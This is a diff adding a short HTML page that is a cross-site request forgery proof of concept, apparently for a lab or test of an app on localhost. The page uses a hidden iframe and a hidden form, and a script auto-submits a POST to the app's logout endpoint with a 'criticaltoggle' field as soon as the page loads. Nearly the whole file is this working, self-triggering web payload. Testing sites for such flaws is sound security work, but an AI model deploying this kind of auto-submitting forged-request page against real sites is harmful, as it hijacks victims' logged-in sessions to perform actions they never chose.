@@ -1,0 +1,12 @@
+<html>
+
+<body>
+    <iframe style="display:none" name="csrf-frame"></iframe>
+    <form method='POST' action='http://localhost:3000/logout' target="csrf-frame" id="csrf-form">
+        <input type='hidden' name='criticaltoggle' value='true'>
+        <input type='submit' style="display:none" value='submit'>
+    </form>
+    <script>document.getElementById("csrf-form").submit()</script>
+</body>
+
+</html>
